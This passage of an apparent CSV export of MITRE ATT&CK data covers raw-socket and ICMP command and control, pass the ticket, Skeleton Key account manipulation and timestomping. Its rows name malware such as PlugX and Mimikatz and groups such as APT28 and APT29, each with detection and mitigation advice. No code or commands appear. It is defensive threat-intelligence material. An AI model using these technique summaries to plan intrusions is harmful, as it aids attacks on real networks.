Backdoor.APT.FakeWinHTTPHelper",['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
413,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0155|WINDSHIELD]] C2 traffic can communicate via TCP raw sockets.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: WINDSHIELD,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
414,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0158|PHOREAL]] communicates via ICMP for C2.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: PHOREAL,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
415,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0083|Misdat]] network traffic communicates over a raw socket.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Misdat,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
416,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0084|Mis-Type]] network traffic can communicate over a raw socket.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Mis-Type,['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
417,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0013|PlugX]] can be configured to use raw TCP or UDP for command and control.[[CiteRef::Dell TG-3390]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
418,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['An [[Group/G0022|APT3]] downloader establishes SOCKS5 connections for its initial C2.[[CiteRef::FireEye Operation Double Tap]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
419,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0013|PlugX]] can be configured to use raw TCP or UDP for command and control.[[CiteRef::Dell TG-3390]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
420,"['Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],[],['[[Software/S0013|PlugX]] can be configured to use raw TCP or UDP for command and control.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1095'],['Standard Non-Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1095
421,"['Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to ""Integrity check on decrypted field failed"" and indicates misuse by a previously invalidated golden ticket.[[CiteRef::CERT-EU Golden Ticket Protection]]']",[],[],['Ryan Becwar'],['Authentication logs'],['Some [[Software/S0053|SeaDuke]] samples have a module to use pass the ticket with Kerberos for authentication.[[CiteRef::Symantec Seaduke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Monitor domains for unusual credential logons. Limit credential overlap across systems to prevent the damage of credential compromise. Ensure that local administrator accounts have complex, unique passwords. Do not allow a user to be a local administrator for multiple systems. Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.[[CiteRef::ADSecurity AD Kerberos Attacks]]\n\nFor containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it.[[CiteRef::CERT-EU Golden Ticket Protection]]\n\nAttempt to identify and block unknown or malicious software that could be used to obtain Kerberos tickets and use them to authenticate by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires Microsoft Windows as a target system and Kerberos authentication enabled.'],"Software: SeaDuke, SeaDaddy, SeaDesk",['Lateral Movement'],['Technique/T1097'],['Pass the Ticket'],https://attack.mitre.org/wiki/Technique/T1097
422,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['PittyTiger'],['PittyTiger'],['G0011'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
423,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
424,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['Cleaver'],"['Cleaver', 'TG-2889', 'Threat Group 2889']",['G0003'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
425,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
426,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
427,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
428,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
429,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",[u'[[Group/G0032|Lazarus Group]] malware WhiskeyDelta-Two contains a function that attempts to rename the administrator\u2019s account.[[CiteRef::Novetta Blockbuster Destructive Malware]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
430,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
431,"['Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738.[[CiteRef::Microsoft User Modified Event]] Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems.\n\nUse of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.']",[],[],[],"['Authentication logs', 'API monitoring', 'Windows event logs']",['The [[Software/S0002|Mimikatz]] credential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality.[[CiteRef::Metcalf 2015]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],['Use multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]].\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],Software: Mimikatz,['Credential Access'],['Technique/T1098'],['Account Manipulation'],https://attack.mitre.org/wiki/Technique/T1098
432,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0066|3PARA RAT]] has a command to set certain attributes such as creation/modification timestamps on files.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: 3PARA RAT,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
433,['Forensic techniques exist to detect aspects of files that have had their timestamps modified.[[CiteRef::WindowsIR Anti-Forensic Techniques]] It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.'],['Host forensic analysis'],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']",['The [[Software/S0021|Derusbi]] malware supports timestomping.[[CiteRef::Axiom]][[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],['Mitigation of timestomping specifically is likely difficult. Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to perform timestomping by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Derusbi,['Defense Evasion'],['Technique/T1099'],['Timestomp'],https://attack.mitre.org/wiki/Technique/T1099
